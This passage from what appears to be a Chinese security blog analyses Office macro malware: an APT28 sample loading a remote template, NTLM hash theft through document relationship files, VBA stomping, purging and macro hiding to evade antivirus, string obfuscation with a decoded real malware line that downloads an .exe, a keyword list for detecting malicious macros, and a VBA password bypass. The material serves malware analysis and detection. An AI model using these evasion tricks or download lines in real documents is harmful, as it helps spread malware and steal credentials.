+<h5 id="样例分析-1"><a href="#样例分析-1" class="headerlink" title="样例分析"></a>样例分析</h5><p>File: APT28.DOCX<br>      SHA1: 8fb0124def0e5a7a12495ede2a20a9c48a7929a6</p>
+<p>文档被设计为通过内嵌在DOCX文档中的settings.xml.rels组件来从hxxp:&#x2F;&#x2F;109.248.148.42&#x2F;office&#x2F;thememl&#x2F;2012&#x2F;main&#x2F;attachedTemplate.dotm加载恶意启用宏的内容</p>
+<p><img src="https://raw.githubusercontent.com/nickyl07/image/PicGo/202408011404136.png" alt="image-20240801140349241"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.secrss.com/articles/7061">APT28新动向：利用英国脱欧主题钓鱼邮件传播Zekapab恶意软件 </a></p>
+<h3 id="窃取NTLM-Hashes"><a href="#窃取NTLM-Hashes" class="headerlink" title="窃取NTLM Hashes"></a>窃取NTLM Hashes</h3><p>NTLM Hashes通常是指Windows系统下Security Account Manager中保存的用户密码hash。</p>
+<p>此技术利用DOCX文档中的webSetings.xml.rels文件，且只有在Office2010及之后版本才能利用成功。</p>
+<p>恶意构造的docx打开时会访问远程资源，访问远程资源使用NTLM协议进行身份验证，从而泄露NTLM Hashes信息。</p>
+<p><img src="https://pentestlab.blog/wp-content/uploads/2017/12/websettings-xml-relationship-file-contents.png?w=760" alt="webSettings XML Relationship File - Contents"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/">pentestlab</a></p>
+<h3 id="VBA-stomping"><a href="#VBA-stomping" class="headerlink" title="VBA stomping"></a>VBA stomping</h3><p>VBA在Office文档中可以以下面三种形似存在</p>
+<p>1、源代码。宏模块的原始源代码被压缩，并存储在模块流的末尾，可以使用’Attribut’字符串识别。</p>
+<p>2、P-Code。P-code，即Pseudo Code（伪代码），是vba宏代码被vba编辑器编译之后的代码。平常Alt+F11打开所看到的正是反编译的P-Code。</p>
+<p>3、ExeCodes。当P-Code执行一次之后，其会被一种标记化的形式存储在__SRP__流中，之后再次运行时会提高VBA的执行速度，可以将其删除，并不影响宏的执行。</p>
+<p><img src="https://s2.loli.net/2024/08/04/oabOzXvcCm947kF.png" alt="image-20240804203849340"></p>
+<p><img src="https://bbs.kanxue.com/upload/attach/202106/755584_XUENBEXAKA6PTR8.png" alt="图片描述"></p>
+<p><img src="https://bbs.kanxue.com/upload/attach/202106/755584_EVD2GU6H4EFWJMB.png" alt="图片描述"></p>
+<p>每一个流模块中都会存在一个未被文档化的PerformanceCache，其中包含了被编译后的P-Code代码，如果_VBA_PROJECT流中指定的Office版本与打开的Office版本相同，则会忽略流模块中的源代码，去执行P-Code代码。</p>
+<p>即如果满足脚本编译环境和执行环境的VBA版本一致，可以修改源码部分，以干扰分析工具，绕过AV检测，解释器会直接执行旧缓存。</p>
+<p>将恶意的源码与非恶意的VBA源码进行交换，保留p-code不变。宏被特定版本的 Office 打开时才会执行恶意宏代码，除此之外的 Office 版本打开时执行正常宏代码。</p>
+<p>此工具实现了这一攻击过程，<a target="_blank" rel="noopener" href="https://github.com/outflanknl/EvilClippy">https://github.com/outflanknl/EvilClippy</a></p>
+<h3 id="VBA-purging"><a href="#VBA-purging" class="headerlink" title="VBA purging"></a>VBA purging</h3><p>与VBA stomping相反，VBA purging保留了源码，删除了p-code及相关部分。<br>从模块流和_VBA_PROJECT流中删除Pcode，将MODULEOFFSET的值更改为0，并删除所有SRP流。更容易绕过AV检测和YARA规则<br>此工具实现了这一攻击过程，<a target="_blank" rel="noopener" href="https://github.com/fireeye/OfficePurge">https://github.com/fireeye/OfficePurge</a></p>
+<h3 id="Hiding-macros"><a href="#Hiding-macros" class="headerlink" title="Hiding macros"></a>Hiding macros</h3><p>当文档运行p-code时，VBA引擎会根据p-code修复源码。所以只要p-code运行，使用vba编辑器查看到的就还是源码。即便将doc的源码进行了替换，但是用word打开时还是原来的代码。</p>
+<p>想要在VBA编辑器中隐藏真正的宏，只需要修改PROJECT流中的”Module&#x3D;abcdefg\x0D\x0A”删除并重新保存。这样能够达成成功执行vba代码，但是vba编辑器看不到对应的源码的效果。</p>
+<p>可使用工具EviClippy实现，使用-g参数隐藏vba源码。</p>
+<p>要使项目锁定且不可看，可以修改PROJECT流ProjectProtectionState和ProjectVisibilityState这两个属性。</p>
+<p>将其内容改为任意值，会使得VBA工程被锁定且不可看，只修改ProjectVisibilityState，VBA工程目录可看，但单个代码模块不可看。</p>
+<p>可以使用EvilClippy解除锁定，EvilClippy -uu 目标文件。</p>
+<h3 id="字符串混淆"><a href="#字符串混淆" class="headerlink" title="字符串混淆"></a>字符串混淆</h3><p>因为宏代码很容易获取，所以对宏代码的处理往往是进行字符串混淆。</p>
+<h4 id="Chr-函数"><a href="#Chr-函数" class="headerlink" title="Chr()函数"></a>Chr()函数</h4><p>Chr()，返回以数值表达式值为编码的字符（例如：Chr(70)返回字符‘F’）。举例如下：</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nrh1INh1S5hGed = <span class="string">&quot;h&quot;</span> &amp; Chr(<span class="number">116</span>) &amp; Chr(<span class="number">61</span>) &amp; <span class="string">&quot;t&quot;</span> &amp; Chr(<span class="number">112</span>) &amp;Chr(<span class="number">58</span>) &amp; Chr(<span class="number">47</span>) &amp; Chr(<span class="number">59</span>) &amp; Chr(<span class="number">47</span>) &amp; Chr(<span class="number">99</span>) &amp; Chr(<span class="number">104</span>) &amp; Chr(<span class="number">97</span>) &amp; <span class="string">&quot;t&quot;</span> &amp; Chr(<span class="number">101</span>) &amp; Chr(<span class="number">97</span>) &amp; Chr(<span class="number">117</span>) &amp; Chr(<span class="number">45</span>) &amp; Chr(<span class="number">100</span>) &amp; Chr(<span class="number">60</span>) &amp; Chr(<span class="number">101</span>) &amp; Chr(<span class="number">115</span>) &amp; Chr(<span class="number">45</span>) &amp; Chr(<span class="number">105</span>) &amp; Chr(<span class="number">108</span>) &amp; <span class="string">&quot;e&quot;</span> &amp; Chr(<span class="number">115</span>) &amp; Chr(<span class="number">46</span>) &amp; Chr(<span class="number">61</span>) &amp; Chr(<span class="number">99</span>) &amp; Chr(<span class="number">111</span>) &amp; Chr(<span class="number">109</span>) &amp; Chr(<span class="number">47</span>) &amp; Chr(<span class="number">60</span>) &amp; Chr(<span class="number">52</span>) &amp; Chr(<span class="number">116</span>) &amp; Chr(<span class="number">102</span>) &amp; Chr(<span class="number">51</span>) &amp; Chr(<span class="number">51</span>) &amp; Chr(<span class="number">119</span>) &amp; Chr(<span class="number">47</span>) &amp; Chr(<span class="number">60</span>) &amp; Chr(<span class="number">119</span>) &amp; <span class="string">&quot;4&quot;</span> &amp; Chr(<span class="number">116</span>) &amp; Chr(<span class="number">52</span>) &amp; Chr(<span class="number">53</span>) &amp; Chr(<span class="number">51</span>) &amp; Chr(<span class="number">46</span>) &amp; Chr(<span class="number">59</span>) &amp; Chr(<span class="number">101</span>) &amp; Chr(<span class="number">61</span>) &amp; Chr(<span class="number">120</span>) &amp; Chr(<span class="number">101</span>)</span><br></pre></td></tr></table></figure>
+
+<p>解混淆： 查找–替换-转换</p>
+<p>“ht&#x3D;tp:&#x2F;;&#x2F;chateau-d&lt;es-iles.&#x3D;com&#x2F;，4tf33w&#x2F;&lt;w4t453.;e&#x3D;xe”</p>
+<p>Chr（）函数还可以利用表达式：</p>
+<p>Ndjs &#x3D; Sgn(Asc(317 - 433) + 105）</p>
+<p>ATTH &#x3D; Chr(Ndjs) + Chr(Ndjs + 12) + Chr(Ndjs + 12) + Chr(Ndjs + 8)</p>
+<h4 id="Replace（）函数"><a href="#Replace（）函数" class="headerlink" title="Replace（）函数"></a>Replace（）函数</h4><p>Replace函数的作用就是替换字符串，返回一个新字符串，其中某个指定的子串被另一个子串替换。</p>
+<p>承接上文，把Nrh1INh1S5hGed中多余字符去掉，这里使用Replace函数把多余字符替换为空</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nrh1INh1S5hGed = Replace(Replace(Replace(Nrh1INh1S5hGed,Chr(<span class="number">60</span>), <span class="string">&quot;&quot;</span>), Chr(<span class="number">61</span>), <span class="string">&quot;&quot;</span>), Chr(<span class="number">59</span>), <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>处理之后：Nrh1INh1S5hGed&#x3D;“<a target="_blank" rel="noopener" href="http://chateau-des-iles.com/4tf33w/w4t453.exe%E2%80%9D">http://chateau-des-iles.com/4tf33w/w4t453.exe”</a></p>
+<h4 id="CallByname-函数"><a href="#CallByname-函数" class="headerlink" title="CallByname 函数"></a>CallByname 函数</h4><p>CallByname函数允许使用一个字符串在运行时指定一个属性或方法。用法如下：</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Result = CallByName(<span class="type">Object</span>, ProcedureName, CallType, Arguments())</span><br></pre></td></tr></table></figure>
+
+<p>第一个参数，包含要对其执行动作的对象名。</p>
+<p>第二个参数，ProcedureName是一个字符串，包含将要调用的方法。</p>
+<p>第三个参数，CallType 包含一个常数，代表要调用的过程的类型：方法 (vbMethod)、property let (vbLet)、property get (vbGet)，或 property set (vbSet)。</p>
+<table>
+<thead>
+<tr>
+<th><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/dotnet/api/microsoft.visualbasic.constants.vbget?view=net-7.0#microsoft-visualbasic-constants-vbget">vbGet</a></th>
+<th>指定在调用 <code>CallByName</code> 函数时，应检索一个属性值。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/dotnet/api/microsoft.visualbasic.constants.vblet?view=net-7.0#microsoft-visualbasic-constants-vblet">vbLet</a></td>
+<td>指示在调用 <code>CallByName</code> 函数时，应将属性值设置为对象实例。</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/dotnet/api/microsoft.visualbasic.constants.vbmethod?view=net-7.0#microsoft-visualbasic-constants-vbmethod">vbMethod</a></td>
+<td>指定在调用 <code>CallByName</code> 函数时，应调用一个方法。</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/dotnet/api/microsoft.visualbasic.constants.vbset?view=net-7.0#microsoft-visualbasic-constants-vbset">vbSet</a></td>
+<td>指示在调用 <code>CallByName</code> 函数时，应设置一个属性值。</td>
+</tr>
+</tbody></table>
+<p>最后一个参数是可选的，它包含一个变量数组，数组中包含该过程的参数。</p>
+<p>例如：CallByName Text1, “Move”, vbMethod, 100, 100 就相当于执行Text1.Move(100,10) 。</p>
+<p>利用callByName，可以用脚本控制控件:</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Dim</span> obj <span class="keyword">As</span> <span class="type">Object</span>[/align]        </span><br><span class="line"><span class="keyword">Set</span> obj = <span class="keyword">Me</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span> obj = CallByName(obj, <span class="string">&quot;Text1&quot;</span>, VbGet)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span> obj = CallByName(obj, <span class="string">&quot;Font&quot;</span>, VbGet)</span><br><span class="line"></span><br><span class="line">    CallByName obj, <span class="string">&quot;Size&quot;</span>, VbLet, <span class="number">50</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27;以上代码=&quot;Me.Text1.Font.Size = 50&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Dim</span> obj <span class="keyword">As</span> <span class="type">Object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Dim</span> V <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span> obj = <span class="keyword">Me</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span> obj = CallByName(obj, <span class="string">&quot;Text1&quot;</span>, VbGet)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span> obj = CallByName(obj, <span class="string">&quot;Font&quot;</span>, VbGet)</span><br><span class="line"></span><br><span class="line">    V = CallByName(obj, <span class="string">&quot;Size&quot;</span>, VbGet)</span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27;以上代码=&quot;V = Me.Text1.Font.Size&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Alias别名"><a href="#Alias别名" class="headerlink" title="Alias别名"></a>Alias别名</h4><p>Alias子句是一个可选的部分，用户可以通过它所标识的别名对动态库中的函数进行引用。</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Public</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> clothed <span class="keyword">Lib</span> <span class="string">&quot;user32&quot;</span> <span class="keyword">Alias</span> <span class="string">&quot;GetUpdateRect&quot;</span> (prestigiation <span class="keyword">As</span> <span class="type">Long</span>, knightia <span class="keyword">As</span> <span class="type">Long</span>, otoscope <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Boolean</span></span><br></pre></td></tr></table></figure>
+
+<p>释义：”user32” 库里的函数”GetUpdateRect”的别名clothed。调用clothed函数相当于调用user32库里的GetUpdateRect函数。</p>
+<p>更多时候使用别名是，因为Visual Basic不允许调用以下划线为前缀的函数，而在Win32 API函数中有大量C开发的函数可能以下划线开始。使用别名可以绕过这个限制。</p>
+<h4 id="利用窗体、控件隐藏信息"><a href="#利用窗体、控件隐藏信息" class="headerlink" title="利用窗体、控件隐藏信息"></a>利用窗体、控件隐藏信息</h4><p>控件里可能存放着关键字符串，程序用到上述字符串时，再调用标签控件的caption属性。</p>
+<p>控件的各个属性（name、caption、controtiptext、等）都可以成为危险字符串的藏身之所。而仅仅查看宏代码，分析者无法得知这些字符串内容，必须进入编辑器查看窗体属性才能看到。</p>
+<h4 id="利用文件属性"><a href="#利用文件属性" class="headerlink" title="利用文件属性"></a>利用文件属性</h4><p>这种方式和利用窗体属性的方式类似，就是将一切能存储数据的地方利用起来。就像Demo3中读取文件详细信息中的备注</p>
+<p><img src="https://raw.githubusercontent.com/nickyl07/image/PicGo/202407301833032.png" alt="image-20240730113032781"></p>
+<h4 id="恶意行为字符串"><a href="#恶意行为字符串" class="headerlink" title="恶意行为字符串"></a>恶意行为字符串</h4><p>常见宏病毒执行恶意操作时代码中含有的字符串，详见下表：</p>
+<table>
+<thead>
+<tr>
+<th>字符串</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>http</td>
+<td>URL连接</td>
+</tr>
+<tr>
+<td>CallByName</td>
+<td>允许使用一个字符串在运行时指定一个属性或方法，许多宏病毒使用CallByName执行危险函数</td>
+</tr>
+<tr>
+<td>Powershell</td>
+<td>可以执行脚本，运行.exe文件，可以执行base64的命令</td>
+</tr>
+<tr>
+<td>Winmgmts</td>
+<td>WinMgmt.exe是Windows管理服务，可以创建windows管理脚本</td>
+</tr>
+<tr>
+<td>Wscript</td>
+<td>可以执行脚本命令</td>
+</tr>
+<tr>
+<td>Shell</td>
+<td>可以执行脚本命令</td>
+</tr>
+<tr>
+<td>Environment</td>
+<td>宏病毒用于获取系统环境变量</td>
+</tr>
+<tr>
+<td>Adodb.stream</td>
+<td>用于处理二进制数据流或文本流</td>
+</tr>
+<tr>
+<td>Savetofile</td>
+<td>结合Adodb.stream用于文件修改后保存</td>
+</tr>
+<tr>
+<td>MSXML2</td>
+<td>能够启动网络服务</td>
+</tr>
+<tr>
+<td>XMLHTTP</td>
+<td>能够启动网络服务</td>
+</tr>
+<tr>
+<td>Application.Run</td>
+<td>可以运行.exe文件</td>
+</tr>
+<tr>
+<td>Download</td>
+<td>文件下载</td>
+</tr>
+<tr>
+<td>Write</td>
+<td>文件写入</td>
+</tr>
+<tr>
+<td>Get</td>
+<td>http中get请求</td>
+</tr>
+<tr>
+<td>Post</td>
+<td>http中post请求</td>
+</tr>
+<tr>
+<td>Response</td>
+<td>http中认识response回复</td>
+</tr>
+<tr>
+<td>Net</td>
+<td>网络服务</td>
+</tr>
+<tr>
+<td>WebClient</td>
+<td>网络服务</td>
+</tr>
+<tr>
+<td>Temp</td>
+<td>常被宏病毒用于获取临时文件夹</td>
+</tr>
+<tr>
+<td>Process</td>
+<td>启动进程</td>
+</tr>
+<tr>
+<td>Cmd</td>
+<td>执行控制台命令</td>
+</tr>
+<tr>
+<td>createObject</td>
+<td>宏病毒常用于创建进行危险行为的对象</td>
+</tr>
+<tr>
+<td>Comspec</td>
+<td>%ComSpec%一般指向你cmd.exe的路径</td>
+</tr>
+</tbody></table>
+<h3 id="宏VBA密码工程文件密码破解"><a href="#宏VBA密码工程文件密码破解" class="headerlink" title="宏VBA密码工程文件密码破解"></a>宏VBA密码工程文件密码破解</h3><p><img src="https://attach.52pojie.cn/forum/202205/10/142739glu77d9dburldwzv.png" alt="img"></p>
+<p>使用 WinHex软件二进制编辑器打开vbaProject.bin，搜索【DPB】,将【DPB】改为【DPX】并保存。</p>
+<p><img src="https://attach.52pojie.cn/forum/202205/10/142721qrq4811r7nq8a8rm.png" alt="img"></p>
+<p>将修改后的vbaProject.bin替换掉原来的文件,文件重新改回到原来的格式。</p>
+<p>打开文件，忽略错误，就可以查看VBA代码了，为了防止报错可以重新添加密码。</p>
+<p><img src="https://attach.52pojie.cn/forum/202205/10/142730mllchcbwdh7h0dvj.png" alt="img"></p>
+<p>【开发工具】–&gt;【Visual Basic】–&gt;【工具】–&gt;【VBA Project属性】–&gt;【保护】重新设置密码</p>
+<p><img src="https://attach.52pojie.cn/forum/202205/10/142732rcaogeowc5ywbkqc.png" alt="img"></p>
+<p>保存文件，关闭后重新打开，输入设置的密码，即可</p>
+<p>TIPS</p>
+<p>1&gt;    ProjectPassword (section 2.3.1.16): “DPB&#x3D;” 是密码保护 </p>
+<p>2&gt;    ProjectProtectionState (section 2.3.1.15): “CMG&#x3D;” 是保护模式，是否可编辑。 </p>
+<p>3&gt;    ProjectVisibilityState (section 2.3.1.17): “GC&#x3D;” 是否可见。</p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/TonyChen56/Virus-Analysis">https://github.com/TonyChen56/Virus-Analysis</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1634125-1-1.html">宏VBA密码工程文件密码破解 - 吾爱破解</a>w</p>
+<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-268255.htm#msg_header_h1_4">office病毒分析资料整理-看雪</a></p>
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left "
+    
+      href="/2024/07/22/Mirai%E7%9A%84%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/"
+      title="Mirai的僵尸网络"
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+      
+        Mirai的僵尸网络
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2024/05/20/%E7%BB%8F%E5%85%B8%E7%99%BD%E5%8A%A0%E9%BB%91/"
+      title="经典白加黑"
+     >
+
+    <p class="title-text">
+      
+        经典白加黑
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+
+
+
+
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2024 NOK<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
+        <i class="fa-solid fa-angle-up"></i>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.classList.remove('hide')
+        } else {
+            btn.classList.add('hide')
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
